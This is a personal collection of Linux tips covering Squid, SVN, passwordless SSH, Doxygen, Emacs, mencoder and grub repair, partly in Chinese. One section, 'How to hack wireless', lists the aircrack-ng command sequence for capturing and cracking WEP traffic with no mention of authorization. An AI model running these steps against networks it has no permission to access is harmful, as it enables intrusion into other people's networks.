.. index::linux tips

******************************************
A collection of my linux tips
******************************************

rm argument list too long
===============================

USE find::

 find . -name '*.txt' | xargs rm

Setup commands for Service on my desktop
======================================================

- vsftpd: 

.. code-block:: none

    sudo /etc/rc.d/vsftpd start

- mysqld:

.. code-block:: none

    sudo /etc/rc.d/mysqld start

- apache

.. code-block:: none

    sudo apachectl start

- squid::

    sudo squid
    sudo squid -k reconfigure 

- Starting Squid

After you've finished editing the configuration file, you can start Squid for the first time. First, you must create the swap directories. Do this by running Squid with the -z option::

/usr/local/squid/sbin/squid -z

Once that completes, you can start Squid and try it out. Probably the best thing to do is run it from your terminal and watch the debugging output. Use this command::

/usr/local/squid/sbin/squid -NCd1

If everything is working fine, then your console displays: "Ready to serve requests".

If you want to run squid in the background, as a daemon process::

/usr/local/squid/sbin/squid

You should be a privileged user to start/stop squid..


- goagent

.. code-block:: none

    goagent start

- gappproxy

.. code-block:: none

    gapproxy start



Ubuntu tips
=====================

- Delete the ubuntu 11.04 file usage history::

    rm ~/.local/share/zeitgeist/activity.sqlite
    zeitgeist-daemon --replace

Archlinux tips
=====================
- `Disable_PC_Speaker_Beep <https://wiki.archlinux.org/index.php/Disable_PC_Speaker_Beep#In_console>`_ ::

    xset -b

- If you want to auto start some service like

  1. squid
  #. vsftp
  #. apache
  #. mysqld

  Just put it into rc.conf as below::

    DAEMONS=(squid vsftpd httpd mysqld sshd hwclock syslog-ng network netfs crond dbus kdm cupsd)


Squid Tips
========================

Set Reverse proxy
--------------------------
Add the following lines to squid.conf::
    
    #Reverse
    http_port <local ip>:80 accel defaultsite=www.cnmath.org
    
    cache_peer <ip.of.webserver1> parent 80 0 no-query originserver name=server_2
    acl sites_server_2 dstdomain <domain.for.webserver1>
    cache_peer_access server_2 allow all
    
    cache_peer <ip.of.webserver2> parent 80 0 no-query originserver name=server_1
    acl sites_server_1 dstdomain <domain.for.webserver2>
    cache_peer_access server_1 allow all
    


Little softwares
==========================


I. `menumaker <http://menumaker.sourceforge.net/>`_ for IceWM:

.. code-block:: none

    mmaker IceWM

.. _doxygen:


.. index:: doxygen

Doxygen
====================

- Chinese Guide of Doxygen for `chm <http://www.fmddlmyy.cn/text21.html>`_
- Chinese `Manual of Doxygen <http://cpp.ezbty.org/content/science_doc/doxygen%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3>`_

Use Chinse in Doxygen Latex:
-----------------------------------
  1. set LANGUAGE in Doxyfile as Chinese

  #. add xeCJK settings at the very previous lines of "\\begin{document}"::
  
       \usepackage{xeCJK}
       \setCJKmainfont{AR PL UKai CN}
       \begin{document}

     Or use my package `berserk.sty <ftp://lab.yeshiwei.com/tex/berserk.sty>`_ , put it into the direcotry, and::
  
       \usepackage{berserk}
       \begin{document}

  #. finally edit the Makefile change "pdflatex" to "xelatex".

Emacs tips
================

install under ubuntu
-----------------------

comand & package::

 sudo apt-get install emacs ecb auctex doxymacs

my .emacs configure file
-----------------------------

`.emacs <_static/.emacs>`_


doxymacs
-----------------------

Active it and set the user email in .emacs::

    (require 'doxymacs)
    (setq-default user-mail-address "...")
    
auto-complete
------------------------

http://cx4a.org/software/auto-complete/#Downloads

无法打开ibus输入法的问题
----------------------------

通过把 LC_CTYPE 设置为 zh_CN 才可以在 Emacs 里使用输入法，例如，可以通过如下方式启动 Emacs ：

LC_CTYPE=zh_CN.utf8 emacs

http://blog.pluskid.org/?p=328

TexLive Tips
==================

- Solve::

    Error: Missing language pack for 'Adobe-GB1' mapping

with::

    apt-get install poppler-data

- `xelatex template </doc.tar.gz>`_ （中文模板）
 


SVN
==================================================

`Setup a Subversion Server in 4 Minutes <http://www.tonyspencer.com/2007/03/02/setup-a-subversion-server-in-4-minutes/>`_

You are going to need to type fast but I think you can do it in 4 minutes.   These are my notes on what worked for me on my Fedora core 6 with svn lib already installed by the package manager:

Create a Repository
--------------------------------------------------

svnadmin create /svnrepos

Create a SVN User
--------------------------------------------------
::

 vi /svnrepos/conf/svnserve.conf

In that file add these three lines::

 anon-access = none
 auth-access = write
 password-db = passwd

Create a password file::

 vi /svnrepos/conf/passwd

In that file add a line for your user::

 # add users in the format : user = password
 tony = mypassword

Import Your Project
--------------------------------------------------

(assuming you’ve put your project files in /projects/myrailsproject)::

 svn import /projects/myrailsproject file:///svnrepos/myrailsproject

Start the SVN Server as Daemon
----------------------------------------------------------------------------------------------------
::

 svnserve -d

Done! You should now have a svn server running with one project named myrailsproject.

Try checking it out of the repository::

 svn co svn://192.168.0.2/svnrepos/myyrailsproject

Since we set anon-access to none you should be prompted for username and password which you created in the file /svnrepos/conf/passwd.

文档查看器（Evince）打开中文PDF显示方块的问题
====================================================================================

使用Evince打开部分pdf文件，特别是中国知网上下载的pdf论文时，常常显示为方块。
evince,okular, epdfview的pdf功能均由xpdf的分支poppler提供。poppler官方网站：http://poppler.freedesktop.org

必须先安装poppler-data::
 
 sudo apt-get install poppler-data

如果已经安装了文泉驿正黑字体，使用下面的方法解决显示方块问题::

 sudo gedit  /etc/fonts/conf.d/49-sansserif.conf

将倒数第四行的sans-serif修改为WenQuanYi Zen Hei就可以了。 

修改为其他的中文字体名称应该也是可以的。

设置 SSH 不用密码登录另一台电脑
============================================================

Your aim
---------------------------

You want to use Linux and OpenSSH to automize your tasks. Therefore you need an automatic login from host A / user a to Host B / user b. You don't want to enter any passwords, because you want to call ssh from a within a shell script.

How to do it
--------------------------

First log in on A as user a and generate a pair of authentication keys. Do not enter a passphrase::

 a@A:~> ssh-keygen -t rsa
 Generating public/private rsa key pair.
 Enter file in which to save the key (/home/a/.ssh/id_rsa): 
 Created directory '/home/a/.ssh'.
 Enter passphrase (empty for no passphrase): 
 Enter same passphrase again: 
 Your identification has been saved in /home/a/.ssh/id_rsa.
 Your public key has been saved in /home/a/.ssh/id_rsa.pub.
 The key fingerprint is:
 3e:4f:05:79:3a:9f:96:7c:3b:ad:e9:58:37:bc:37:e4 a@A

Now use ssh to create a directory ~/.ssh as user b on B. (The directory may already exist, which is fine)::

 a@A:~> ssh b@B mkdir -p .ssh
 b@B's password: 

Finally append a's new public key to b@B:.ssh/authorized_keys and enter b's password one last time::

 a@A:~> cat .ssh/id_rsa.pub | ssh b@B 'cat >> .ssh/authorized_keys'
 b@B's password: 

From now on you can log into B as b from A as a without password::

 a@A:~> ssh b@B hostname
 B

A note from one of our readers: Depending on your version of SSH you might also have to do the following changes::

 Put the public key in .ssh/authorized_keys2
 Change the permissions of .ssh to 700
 Change the permissions of .ssh/authorized_keys2 to 640

How to hack wireless
==========================

WEBSITES:
http://www.backtrack-linux.org
http://www.imgburn.com

TERMINAL COMMANDS::
 
 Startx
 /etc/init.d/networking start
 airmon-ng
 airmon-ng stop [wireless card name]
 airmon-ng start [wireless card name]
 airmon-ng
 airodump-ng [wireless card name]
 ctrl c
 airodump-ng w wep c [channel number] bssid [Bssid number] [wireless card name]
 aireplay-ng -1 0 a [bssid] [wireless card name]
 aireplay-ng -3 b [bssid][wireless card name]
 ctrl + c
 dir
 aircrack-ng [filename]

Extract audio from video
=================================================

假如在欣赏电影过程中出现了一段美妙的插曲（特别是印度电影，一般都会有很多歌舞片段），很多时候我们都想将其截取下来并作为mp3格式保存！利用mencoder可以很容易的实现这一愿望::

 mencoder -o out.mp3 -ovc frameno -oac mp3lame -lameopts cbr:br=128 -of rawaudio -ss 1:30 -endpos 2:45 test.rmvb

在实际操作中，用户需要更改的就是那两个时间参数值了！该命令参数的详细说明如下::

 -o out.mp3 输出的目标文件名称
 -ovc frameno 不处理视频编码
 -oac mp3lame 输出的音频编码格式为mp3
 -lameopts cbr:br=128 音频附件选项，cbr(常量比特率)编码格式，音频码流为128bps(对于mp3来说，128已经足够了)
 -of rawaudio 输出文件为原始音频流
 -ss 1:30 音频截取的起始时间(表示从影片的第1分30秒开始截取)
 -endpos 2:45 预截取音频的长度(表示预截取的音频长度是2分45秒，那么可以计算出其结束时间是4:15)
 test.rmvb 输入源文件

举个简单例子：如果想截取影片中1:28:10~1:30:25这段时间的音频，则 -ss参数的值应该是88:10(1小时28分等于88分)，-endpos参数的值应该是2:15(就是上面两个时间段的差值了)，然后将实际参数值代入上面命令即可！

上面的示例选用的输入源文件是rmvb格式，当然了，像avi、mp4等格式的多媒体文件肯定也是可行的！

上面展示的仅是提取音频，如果想保存为MTV，那就更简单了：
对于rmvb文件：mencoder -o mtv.avi -ovc lavc -oac mp3lame -ss 1:30 -endpos 2:45 test.rmvb
对于 avi 文件：mencoder -o mtv.avi -ovc copy -oac copy -ss 1:30 -endpos 2:45 test.rmvb

-ss参数使用参考示例::

 -ss 10 从10秒开始
 -ss 10:10 从10分10秒开始
 -ss 1:10:10 从1小时10分10秒开始

-endpos参数使用参考示例::

 -endpos 10 编码的时间为10秒
 -endpos 10:10 编码的时间为10分10秒
 -endpos 1:10:10 编码的时间为1小时10分10秒
 -endpos 10mb 编码数据量为10M

repair grub after reinstall win7
============================================================

When you install Windows, Windows assumes it's the only OS on the machine--or at least it doesn't account for Linux. So, it replaces grub with its own boot loader. What you have to do is replace the Windows boot loader with grub. I've seen various instructions for replacing grub by mucking around with grub commands or some such, but to me the easiest way is to simply chroot into your install and run update-grub. chroot is great because it allows you to work on your actual install, instead of trying to redirect things here and there. It's really clean.

Here's how:

Boot from the live CD.
Determine the partition number of your main partition. GParted can help you here. I'm going to assume in this answer that it's /dev/sda2, but make sure you use the correct partition number for your system!
Mount your partition:

sudo mount /dev/sda2 /mnt  # make sure that sda2 is correct!
Bind mount some other necessary stuff:

for i in /sys /proc /run /dev; do sudo mount --bind "$i" "/mnt$i"; done
chroot into your Ubuntu install:

sudo chroot /mnt
At this point, you're in your install, not the live CD, and running as root. Update grub:

update-grub
If you get errors, go to step 7. (Otherwise, it is optional.)

Depending on your situation, you might have to reinstall grub:

grub-install /dev/sda
update-grub # I'm not sure if this is necessary, but it doesn't hurt.
If everything worked without errors, then you're all set:

exit
sudo reboot
At this point, you should be able to boot normally.

If you cannot boot normally, and didn't do step 7 because there were no error messages, try again with step 7.

Sometimes giving GRUB2 the correct configuration for your partitions is not enough, and you must actually install it (or reinstall it) to the Master Boot Record, which step 7 does. Experience helping users in chat has shown that step 7 is sometimes necessary even when no error messages are shown.

Use Monit to keep application alive
============================================================

`Monit <http://mmonit.com/monit/documentation/monit.html>`_
